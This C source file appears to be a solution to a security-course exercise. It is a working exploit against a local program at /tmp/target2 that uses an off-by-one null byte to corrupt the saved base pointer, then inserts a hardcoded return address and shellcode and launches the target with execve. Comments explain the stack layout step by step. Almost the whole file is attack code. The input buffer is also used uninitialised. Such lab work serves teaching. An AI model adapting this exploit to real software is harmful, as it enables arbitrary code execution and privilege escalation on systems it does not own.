#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

/*
We store constants here, including the return address we
found manually, and the 'distance' of our starting pad. This attack
works by overriding the least significant bits of the base pointer
with the null terminator of the string, and therefore we compute the
distance between 0xd00 (LSD of our overridden base pointer) and 0xc88 
(LSD of the pointer to our buffer).
*/
#define TARGET "/tmp/target2"
#define FILLER "A"
#define RETURN_ADDR "\x08\xfd\xff\xbf"
#define PAD_DIST 0xd00 - 0xc88
#define PTR_SPACE sizeof(void*)
#define OVERFLOW_SIZE 240

void ncat(int n, char *str, char*pad)
{
  int i;
  for(i = 0; i < n; i++)
  {
    strcat(str, pad);
  }
}

int main(void)
{
  char *args[3];
  char *env[1];

  char input[OVERFLOW_SIZE];
 
  /*
  We construct the string so that padding exists up until 0xd00, which
  is where our janky base pointer points. 4 spaces above this, we place
  our return address pointing 4 spaces above that where we inject the
  shellcode. Then we pad until the buffer so that our null terminator
  will override the base pointer to point to 0xd00.
  */ 
  int padlen = PAD_DIST+PTR_SPACE;
  ncat(padlen, input, FILLER);
  strcat(input, RETURN_ADDR);
  strcat(input, shellcode);
  padlen = OVERFLOW_SIZE - padlen - PTR_SPACE - strlen(shellcode);
  ncat(padlen, input, FILLER);

  args[0] = TARGET; args[1] = input; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
